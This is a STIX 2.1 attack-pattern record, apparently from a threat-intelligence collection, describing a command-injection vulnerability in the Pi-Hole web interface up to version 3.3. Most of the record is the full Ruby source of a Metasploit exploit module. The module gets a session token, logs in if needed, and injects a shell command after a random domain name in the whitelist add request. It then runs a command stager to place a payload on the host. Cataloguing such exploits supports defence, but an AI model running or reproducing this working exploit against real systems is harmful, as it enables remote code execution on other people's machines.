{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--53db7b12-e450-4960-bcb4-ebb94a57c4d4",
    "created": "2024-08-14T17:14:58.954112Z",
    "modified": "2024-08-14T17:14:58.954117Z",
    "name": "Pi-Hole Whitelist OS Command Execution",
    "description": " This exploits a command execution vulnerability in Pi-Hole <= 3.3. When adding a new domain to the whitelist, it is possible to chain a command to the domain that is run on the OS.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/pihole_whitelist_exec.rb",
            "external_id": "pihole_whitelist_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://pulsesecurity.co.nz/advisories/pihole-v3.3-vulns"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HTTP::Pihole\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Pi-Hole Whitelist OS Command Execution',\n        'Description' => %q{\n          This exploits a command execution vulnerability in Pi-Hole <= 3.3.\n          When adding a new domain to the whitelist, it is possible to chain\n          a command to the domain that is run on the OS.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Denis Andzakovic' # original PoC, discovery\n        ],\n        'References' => [\n          ['URL', 'https://pulsesecurity.co.nz/advisories/pihole-v3.3-vulns']\n        ],\n        'Platform' => ['linux'],\n        'Privileged' => false,\n        'Arch' => [ARCH_X86, ARCH_X64, ARCH_CMD],\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2018-04-15',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'The URI of the Pi-Hole Website', '/'])\n      ]\n    )\n  end\n\n  def execute_command(cmd, _opts = {})\n    # get token\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'admin', 'list.php'),\n      'keep_cookies' => true,\n      'vars_get' => {\n        'l' => 'white'\n      }\n    )\n\n    # check if we got hit by a login prompt\n    if res && res.body.include?('Sign in to start your session')\n      res = login(datastore['PASSWORD'])\n      fail_with(Failure::BadConfig, 'Incorrect Password') if res.nil?\n      # res = send_request_cgi(\n      #   'uri' => normalize_uri(target_uri.path, 'admin', 'list.php'),\n      #   'keep_cookies' => true,\n      #   'ctype' => 'application/x-www-form-urlencoded',\n      #   'cookie' => cookie,\n      #   'vars_get' => {\n      #     'l' => 'white'\n      #   }\n      # )\n    end\n\n    token = get_token('api')\n\n    if token.nil?\n      fail_with(Failure::UnexpectedReply, 'Unable to find token')\n    end\n    print_status(\"Using token: #{token}\")\n\n    send_request_cgi({\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'keep_cookies' => true,\n      'uri' => normalize_uri(target_uri.path, 'admin', 'scripts', 'pi-hole', 'php', 'add.php'),\n      'vars_post' => {\n        'domain' => \"#{rand_text_alphanumeric(3..5)}.com;#{cmd}\",\n        'list' => 'white',\n        'token' => token\n      }\n    })\n  end\n\n  def check\n    begin\n      _version, web_version, _ftl = get_versions\n\n      if web_version.nil?\n        print_error(\"#{peer} - Could not connect to web service - no response or non-200 HTTP code\")\n        return Exploit::CheckCode::Unknown\n      end\n\n      if web_version && Rex::Version.new(web_version) < Rex::Version.new('3.3')\n        vprint_good(\"Web Interface Version Detected: #{web_version}\")\n        return CheckCode::Appears\n      else\n        vprint_bad(\"Web Interface Version Detected: #{web_version}\")\n        return CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"#{peer} - Could not connect to the web service\")\n      return Exploit::CheckCode::Unknown\n    end\n    CheckCode::Safe\n  end\n\n  def exploit\n    if check != CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')\n    end\n\n    begin\n      execute_cmdstager(flavor: :bourne)\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-04-15",
    "x_mitre_platforms": [
        "['linux']"
    ]
}